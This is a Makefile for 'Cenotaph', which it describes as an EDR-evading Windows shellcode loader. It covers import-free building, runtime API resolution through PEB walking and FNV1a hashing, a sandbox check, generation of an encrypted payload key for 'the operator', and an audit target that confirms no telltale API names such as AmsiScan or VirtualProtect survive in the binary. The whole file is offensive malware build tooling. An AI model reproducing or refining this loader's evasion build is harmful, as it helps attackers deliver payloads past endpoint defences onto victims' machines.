# Cenotaph — EDR-fit disk host / fallback shellcode loader.
#
# Cross-compiled on Linux with mingw-w64.  Cenotaph is a *normal* native PE
# (not PIC shellcode), built with no CRT: -nostdlib + an explicit entry
# point.  Zero IAT imports: every API is resolved at runtime via PEB + FNV1a.
#
#   make          -> cenotaph.exe        (release, windows subsystem)
#   make debug     -> cenotaph-debug.exe  (console subsystem, sandbox disabled)
#   make key       -> generate a fresh include/CenKey.h + encrypted payload.dat
#   make audit     -> zero-import + API-string + undefined-symbol checks
#   make clean

CXX      := x86_64-w64-mingw32-g++
STRIP    := x86_64-w64-mingw32-strip
NM       := x86_64-w64-mingw32-nm
OBJDUMP  := x86_64-w64-mingw32-objdump
STRINGS  := x86_64-w64-mingw32-strings

SRC      := src/Ldr.c src/Utils.c src/Host.c
INC      := -Iinclude
OBJDIR   := build

# C++ for constexpr FNV1a hashing (HASH_STR -> compile-time, no name strings).
CFLAGS   := -Os -fno-asynchronous-unwind-tables -fno-exceptions -fno-rtti \
            -fno-builtin -fno-ident -fno-stack-protector -fpack-struct=8 \
            -mno-sse -fpermissive -masm=intel -Wall $(INC)

# No CRT, no import libs.  Explicit entry.
LDFLAGS  := -nostdlib -Wl,-e,CenotaphEntry -Wl,-s

OBJ      := $(OBJDIR)/Ldr.o $(OBJDIR)/Utils.o $(OBJDIR)/Host.o

.PHONY: all debug key audit clean

all: $(OBJDIR) cenotaph.exe

debug: CFLAGS += -DCENOTAPH_SANDBOX_CHECK=0 -g
debug: LDFLAGS := -nostdlib -Wl,-e,CenotaphEntry -Wl,-subsystem,console
debug: $(OBJDIR) cenotaph-debug.exe

$(OBJDIR):
	mkdir -p $(OBJDIR)

$(OBJDIR)/%.o: src/%.c
	$(CXX) $(CFLAGS) -c $< -o $@

cenotaph.exe: $(OBJ)
	$(CXX) $(CFLAGS) $(OBJ) -o $@ $(LDFLAGS) -Wl,-subsystem,windows
	$(STRIP) $@ 2>/dev/null || true

cenotaph-debug.exe: $(OBJ)
	$(CXX) $(CFLAGS) $(OBJ) -o $@ $(LDFLAGS)

# Generate a fresh random key.  The operator then encrypts the real payload
# with the matching key via tools/encrypt.py.
key:
	python3 tools/encrypt.py --header include/CenKey.h

# ---- audit: prove zero imports, no API name strings, clean undefineds ----
audit: cenotaph.exe
	@echo "=== size ==="; ls -l cenotaph.exe | awk '{print $$5" bytes"}'
	@echo "=== imports (must be EMPTY) ==="; \
	  $(OBJDUMP) -p cenotaph.exe | awk '/The Import Tables/{flag=1} flag' | head -20 ; \
	  $(OBJDUMP) -p cenotaph.exe | grep -E 'DLL Name|\.dll' || echo "(none — PASS)"
	@echo "=== API-name string scan (must be EMPTY) ==="; \
	  $(STRINGS) -a cenotaph.exe | grep -iE 'NtAllocate|NtProtect|NtQuerySystem|NtClose|NtDelayExecution|NtCreateFile|NtReadFile|TpAllocWork|TpPostWork|TpReleaseWork|VirtualAlloc|VirtualProtect|LoadLibrary|GetProcAddress|CreateFile|ReadFile|GetModuleFileName|GetFileSize|GetTickCount|Sleep|CloseHandle|AmsiScan|EtwEvent' || echo "(empty — PASS)"
	@echo "=== undefined symbols (must be empty: no CRT, no bare libc) ==="; \
	  $(NM) -u cenotaph.exe 2>/dev/null || echo "(none)"
	@echo "=== entry point ==="; \
	  $(OBJDUMP) -f cenotaph.exe | grep -i 'start address' || true

clean:
	rm -rf $(OBJDIR) cenotaph.exe cenotaph-debug.exe
